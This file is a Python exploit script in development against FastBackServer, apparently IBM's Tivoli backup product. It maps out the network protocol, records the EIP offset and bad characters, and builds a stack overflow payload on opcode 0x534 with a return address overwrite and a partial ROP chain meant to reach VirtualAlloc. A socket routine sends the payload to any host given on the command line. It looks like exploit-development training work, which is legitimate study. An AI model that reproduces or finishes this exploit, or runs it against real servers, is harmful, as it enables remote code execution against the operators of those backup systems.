"""
===============================================================
======================= - Breakpoints - =======================
===============================================================
        bp wsock32!recv
        bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6
        bp FastBackServer!FX_AGENT_Cyclic+0xD0
        bp FastBackServer!FXCLI_OraBR_Exec_Command
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac
        bp FastBackServer!FXCLI_SetConfFileChunk+0x40
===============================================================
================= - Packet/Buffer Structure - =================
===============================================================
        0x00       : Checksum DWORD
        0x04 - 0x34: psAgentCommand
                    - 0x04 - 0xC:  ??
                    - 0x10:         Opcde
                    - 0x14:         Offset for copy operation
                    - 0x18:         Size of copy operation
                    - 0x1C:         Offset for 2nd copy operation
                    - 0x20:         Size of 2nd copy operation
                    - 0x24:         Offset for 3rd copy operation
                    - 0x28:         Size of 3rd copy operation
                    - 0x2C - 0x34: ??
        0x34 - End:  psCommandBuffer

# # Checksum
# buf = pack(">i", 0x2330)

# # psAgentCommand
# buf += bytearray([0x41] * 0x10)
# buf += pack("<i", 0x0)                # 1st memcpy: offset
# buf += pack("<i", 0x1000)             # 1st memcpy: size
# buf += pack("<i", 0x0)                # 2nd memcpy: offset
# buf += pack("<i", 0x1000)             # 2nd memcpy: size
# buf += pack("<i", -0x11000)           # 3rd memcpy: offset
# buf += pack("<i", 0x13000)            # 3rd memcpy: size
# buf += bytearray([0x41] * 0x8)

# # psCommandBuffer
# buf += bytearray([0x45] * 0x100)      # 1st Buffer
# buf += bytearray([0x45] * 0x200)      # 2nd Buffer
# buf += bytearray([0x45] * 0x2000)     # 3rd Buffer
===============================================================

Used MSF-PATTERN_CREATE, found eip at offset 276
                         found esp at offset 280

BAD_CHARS = [0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20]
"""

import socket
import sys
from struct import pack

from colorama import Fore, Style, init
from numpy import byte

init()

# Checksum
buf = bytearray()  # Checksum DWORD        0x00 - 0x04

# psAgentCommand
buf += bytearray([0x41] * 0xC)  # psAgentCommand        0x04 - 0x34
buf += pack("<i", 0x534)  # Opcode                0x10
buf += pack("<i", 0x0)  # 1st memcpy: offset    0x14
buf += pack("<i", 0x500)  # 1st memcpy: size      0x18
buf += pack("<i", 0x0)  # 2nd memcpy: offset    0x1C
buf += pack("<i", 0x100)  # 2nd memcpy: size      0x20
buf += pack("<i", 0x0)  # 3rd memcpy: offset    0x24
buf += pack("<i", 0x100)  # 3rd memcpy: size      0x28
buf += bytearray([0x41] * 0x8)  # N/A                   0x2C - 0x34


# psCommandBuffer

VirtualAlloc = pack("<L", (0x45454545))  # Dummy VirtualAlloc Addr
VirtualAlloc += pack("<L", (0x46464646))  # Dummy VirtualAlloc Ret
VirtualAlloc += pack("<L", (0x47474747))  # Dummy Shellcode Addr
VirtualAlloc += pack("<L", (0x48484848))  # Dummy dwSize
VirtualAlloc += pack("<L", (0x49494949))  # Dummy flAllocationType
VirtualAlloc += pack("<L", (0x51515151))  # Dummy flProtect

offset = b"A" * (276 - len(VirtualAlloc))
eip = pack("<L", (0x50501110))  # CSFTPAV6.dll -> PUSH ESP; PUSH EAX; POP EDI; POP ESI; RET. This got me into the stack for exec
rop = pack("<L", (0x5050118E))  #                 MOV EAX, ESI; POP ESI; RETN
rop += pack("<L", (0x42424242))  # junk, added for alignment
rop += pack("<L", (0x505115a3))  #             -> POP ECX, RET;
rop += pack("<L", (0xffffffe4))  # -0x1c
rop += pack("<L", (0x5051579a))  #             -> ADD EAX, ECX; RET
  


rop += b"C" * (0x400 - 276 - 4 - len(rop))


buffer = offset + VirtualAlloc + eip + rop

buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer, 0, 0, 0, 0)
buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04


def printBuffer(buf, width="db"):
    if width == "db":
        w = 1
        groups_per_line = 16
    elif width == "dw":
        w = 2
        groups_per_line = 8
    elif width == "dd":
        w = 4
        groups_per_line = 4
    else:
        print(f"ERR: Invalid width {width}")
        exit(-1)
    bytes_per_line = groups_per_line * w
    for i in range(0, len(buf), bytes_per_line):
        print(
            Fore.YELLOW
            + f"\t"
            + f"{i:04x} - {min(i+bytes_per_line, len(buf)):04x}: "
            + Style.RESET_ALL,
            end="",
        )
        for g in range(groups_per_line):
            start = i + g * w
            if start >= len(buf):
                break
            if width == "db":
                for j in range(w):
                    if start + j < len(buf):
                        print(f"{buf[start+j]:02x}", end=" ")
                    else:
                        print("  ", end="")
            else:
                val = 0
                for j in range(w):
                    if start + j < len(buf):
                        val |= buf[start + j] << (8 * (w - 1 - j))
                if width == "dw":
                    print(f"{val:04x}", end=" ")
                elif width == "dd":
                    print(f"{val:08x}", end=" ")
        print()


def main():
    if len(sys.argv) != 2:
        print(f"ERR: No ip addr provided")
        exit(-1)

    server = sys.argv[1]
    port = 11460

    print(Fore.CYAN + f"o IP Addr: {server}:{port}" + Style.RESET_ALL)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    print(Fore.CYAN + f"o Sending Buffer ({len(buf)} bytes): " + Style.RESET_ALL)
    printBuffer(buf, width="dd")
    s.send(buf)
    s.close()

    sys.exit(0)


if __name__ == "__main__":
    main()
